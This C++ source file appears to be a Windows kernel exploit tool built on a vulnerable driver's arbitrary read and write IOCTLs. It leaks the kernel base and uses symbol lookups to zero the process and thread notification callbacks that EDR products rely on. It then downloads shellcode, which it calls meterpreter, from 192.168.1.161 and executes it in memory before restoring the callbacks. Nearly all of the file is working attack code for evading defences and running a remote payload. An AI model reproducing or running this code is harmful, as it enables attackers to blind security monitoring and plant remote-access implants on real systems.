#include <cstdint>
#include <cstdio>
#include <string>
#include <iostream>
#include <Windows.h>
#include <DbgHelp.h>
#include <vector>
#include <Urlmon.h>
#include "PdbReader.h"
#include "PdbLocator.h"

#pragma comment(lib, "Dbghelp.lib")
#pragma comment(lib, "urlmon.lib")

#define DEMO_DEVICE 0x8000

// METHOD_NEITHER is vulnerable because it allows the driver to read and write to user-mode buffers
// without any validation or copying, which can lead to security issues such as buffer overflows 
// or arbitrary memory access if the driver does not properly handle the input and output buffers.
#define IOCTL_READ_MSR CTL_CODE(DEMO_DEVICE, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)
#define IOCTL_ARB_READ CTL_CODE(DEMO_DEVICE, 0x801, METHOD_NEITHER, FILE_ANY_ACCESS)
#define IOCTL_ARB_WRITE CTL_CODE(DEMO_DEVICE, 0x802, METHOD_NEITHER, FILE_ANY_ACCESS)

HANDLE gDriver = INVALID_HANDLE_VALUE;

// helper functions ----------------------------------------------------------------------------------------------------------

uint64_t read_qword(uint64_t address)
{
    uint64_t inBuf = address;
    uint64_t outBuf = 0;

    DeviceIoControl(gDriver, IOCTL_ARB_READ, &inBuf, sizeof(uint64_t), &outBuf, sizeof(uint64_t), NULL, NULL);
    return outBuf;
}

struct WRITE_QWORD_INPUT
{
    uint64_t address;
    uint64_t value;
};

void write_qword(uint64_t address, uint64_t value)
{
	WRITE_QWORD_INPUT inBuf = { address, value };

    DeviceIoControl(gDriver, IOCTL_ARB_WRITE, &inBuf, sizeof(WRITE_QWORD_INPUT), NULL, 0, NULL, NULL);
}

uint64_t read_msr(uint32_t msr_register)
{
    uint64_t buffer = 0;
    uint32_t* msr = (uint32_t*)&buffer;
    *msr = msr_register;

    DeviceIoControl(gDriver, IOCTL_READ_MSR, &buffer, sizeof(buffer), &buffer, sizeof(buffer), NULL, NULL);
    return buffer;
}

uint64_t disclose_nt_base()
{
    uint64_t KiSystemCall64Shadow = read_msr(0x0c0000082);

    // fallback tied to exact OS version
    return KiSystemCall64Shadow - 0x0330140;
}

int main()
{
    std::cout << "Kernel Research" << std::endl << "---------------" << std::endl;

    gDriver = CreateFileA("\\\\.\\VulnDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (gDriver == INVALID_HANDLE_VALUE)
    {
        std::cout << "[!] Unable to get a handle to the driver: " << GetLastError() << std::endl;
        return 1;
    }
    else
    {
        std::cout << "[+] Driver handle: " << gDriver << std::endl;
    }

    uint64_t nt = disclose_nt_base();
    
    uint64_t eprocess = read_qword(nt + 0x04c52e0);

    std::cout << "[+] ntoskrnl.exe base: 0x" << std::hex << nt << std::dec << std::endl;

    // find pdb
    /*
	uint64_t _debug_directory_entry = nt + (read_qword(nt + (read_qword(nt + 0x3c) & 0x00000000ffffffff) + 0xb8) & 0x00000000ffffffff);

	std::cout << "[+] Debug directory: 0x" << std::hex << _debug_directory_entry << std::dec << std::endl;
    

    int i = 0;
    for (; i < 0x3; i++) {
        uint32_t type = (uint32_t)read_qword(_debug_directory_entry + (i * 0x1c) + 0x0c);
        if (type == 2) break;
    }
    uint64_t entry = _debug_directory_entry + (i * 0x1c);

	uint64_t debugInfo = nt + (read_qword(_debug_directory_entry + 0x14) & 0x00000000ffffffff);
    std::cout << "[+] debugInfo: 0x" << std::hex << debugInfo << std::dec << std::endl;

    // read guid
    uint64_t qword1 = read_qword(debugInfo + 0x04);
    uint64_t guid4 = _byteswap_uint64(read_qword(debugInfo + 0x0c));

    uint64_t age = read_qword(debugInfo + 0x14) & 0xff;

	uint32_t guid1 = (uint32_t)(qword1 & 0xffffffff);
	uint16_t guid2 = (uint16_t)((qword1 >> 32) & 0xffff);
	uint16_t guid3 = (uint16_t)((qword1 >> 48) & 0xffff);

	std::cout << "[+] guid1: 0x" << std::hex << guid1 << std::dec << std::endl;
	std::cout << "[+] guid2: 0x" << std::hex << guid2 << std::dec << std::endl;
    std::cout << "[+] guid3: 0x" << std::hex << guid3 << std::dec << std::endl;
    std::cout << "[+] guid4: 0x" << std::hex << guid4 << std::dec << std::endl;
    std::cout << "[+] age: 0x" << std::hex << age << std::dec << std::endl;

    char buf[200];
    std::snprintf(buf, sizeof(buf),
        "https://msdl.microsoft.com/download/symbols/ntkrnlmp.pdb/%08X%02X%02X%016llX%X/ntkrnlmp.pdb",
        guid1, guid2, guid3, guid4, age);

    std::cout << "[+] uri: " << buf << std::endl;

	// download the pdb file
    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
	IStream* pStream = NULL;

	hr = URLOpenBlockingStreamA(NULL, buf, &pStream, 0, NULL);

    if (FAILED(hr)) {
        std::cout << "[!] Failed to download pdb file: " << std::hex << hr << std::dec << std::endl;
		CoUninitialize();
		return 1;   
    }

    std::vector<uint8_t> data;
	const size_t bufferSize = 4096;
    uint8_t buffer[bufferSize];
    ULONG bytesRead = 0;
    
    while (SUCCEEDED(pStream->Read(buffer, bufferSize, &bytesRead)) &&
		bytesRead > 0) {
        data.insert(data.end(), buffer, buffer + bytesRead);
    }

	pStream->Release();
	CoUninitialize();

	std::cout << "[+] Downloaded pdb file size: " << data.size() << " bytes" << std::endl;
    */

    // find correct PDB
    std::cout << "[+] Locating the correct PDB file..." << std::endl;
    PdbId id = readCodeViewId(nt);
    //auto  url = symbolServerUrl(id);

    //std::cout << "[+] Downloading the PDB file from the Microsoft symbol server... " << std::endl;
    std::cout << "[+] Downloading the PDB file from the LOCAL server... " << std::endl;

    auto url = "http://192.168.1.161/ntkrnlmp.pdb";

    std::cout << "[+] " << url << std::endl;
    auto  data = downloadPdb(url);

    // locate symbols
    PdbReader pdb(data);
    std::cout << "[+] Locating EDR callback functions..." << std::endl;

    uint32_t rvaProcess = 0;
    if (pdb.findSymbol("PspCreateProcessNotifyRoutine", rvaProcess))
        std::cout << "[+] PspCreateProcessNotifyRoutine RVA: 0x" << std::hex << rvaProcess << std::dec << std::endl;
    else
        std::cout << "[!] PspCreateProcessNotifyRoutine RVA not found" << std::endl;
   
    uint32_t rvaThread = 0;
    if (pdb.findSymbol("PspCreateThreadNotifyRoutine", rvaThread))
        std::cout << "[+] PspCreateThreadNotifyRoutine RVA: 0x" << std::hex << rvaThread << std::dec << std::endl;
    else
        std::cout << "[!] PspCreateThreadNotifyRoutine RVA not found" << std::endl;

    /*
    if (pdb.findSymbol("CallbackListHead", rva))
        std::cout << "[+] CallbackListHead RVA: 0x" << std::hex << rva << std::dec << std::endl;
    else
        std::cout << "[!] CallbackListHead RVA not found" << std::endl;

    if (pdb.findSymbol("PspLoadImageNotifyRoutine", rva))
        std::cout << "[+] PspLoadImageNotifyRoutine RVA: 0x" << std::hex << rva << std::dec << std::endl;
    else
        std::cout << "[!] PspLoadImageNotifyRoutine RVA not found" << std::endl;
    */

    std::cout << "[+] Disabling all callbacks..." << std::endl;

    std::vector<uint64_t> callbacksProcess;
    std::vector<uint64_t> callbacksThread;

    for (size_t i = 0; i < 0x10; i++)
    {
        uint64_t addr = read_qword(nt + rvaProcess + (i * 8));
        if (addr == 0x0)
            break;
        callbacksProcess.push_back(addr);
        //std::cout << "[+] Callback: 0x" << std::hex << addr << std::dec << std::endl;
    }

    //std::cout << "[+] Callback count: 0x" << std::hex << callbacksProcess.size() << std::dec << std::endl;

    for (size_t i = 0; i < (size_t)callbacksProcess.size(); i++)
    {
        write_qword(nt + rvaProcess + (i * 8), 0x0);
    }



    for (size_t i = 0; i < 0x10; i++)
    {
        uint64_t addr = read_qword(nt + rvaThread + (i * 8));
        if (addr == 0x0)
            break;
        callbacksThread.push_back(addr);
        //std::cout << "[+] Callback: 0x" << std::hex << addr << std::dec << std::endl;
    }

    //std::cout << "[+] Callback count: 0x" << std::hex << callbacksProcess.size() << std::dec << std::endl;

    for (size_t i = 0; i < (size_t)callbacksThread.size(); i++)
    {
        write_qword(nt + rvaThread + (i * 8), 0x0);
    }



    // SHELLCODE ------------------------------------------------------------------------------------------------------------------
    std::cout << "[+] Downloading meterpreter..." << std::endl;
    
    std::vector<uint8_t> shellcode = downloadPdb("http://192.168.1.161/lapdog");

    std::cout << "[+] Shellcode downloaded, size: " << shellcode.size() << " bytes" << std::endl;

    // This gets caught by defdender...
    LPVOID alloc = VirtualAlloc(NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    memcpy(alloc, shellcode.data(), (size_t)shellcode.size());
    VirtualProtect(alloc, shellcode.size(), PAGE_EXECUTE_READ, NULL);
    HANDLE hThread = CreateThread(NULL, 0x0, (LPTHREAD_START_ROUTINE)alloc, NULL, 0x0, NULL);


    std::cout << "[+] Waiting for meterpreter to close..." << std::endl;

    WaitForSingleObject(hThread, INFINITE);

    // END SHELLCODE ------------------------------------------------------------------------------------------------------------------




    // restore callbacks
    std::cout << "[+] Restoring all callbacks..." << std::endl;
    for (size_t i = 0; i < (size_t)callbacksProcess.size(); i++)
    {
        write_qword(nt + rvaProcess + (i * 8), callbacksProcess[i]);
    }

    std::cout << "[+] Restoring all callbacks..." << std::endl;
    for (size_t i = 0; i < (size_t)callbacksThread.size(); i++)
    {
        write_qword(nt + rvaThread + (i * 8), callbacksThread[i]);
    }
}
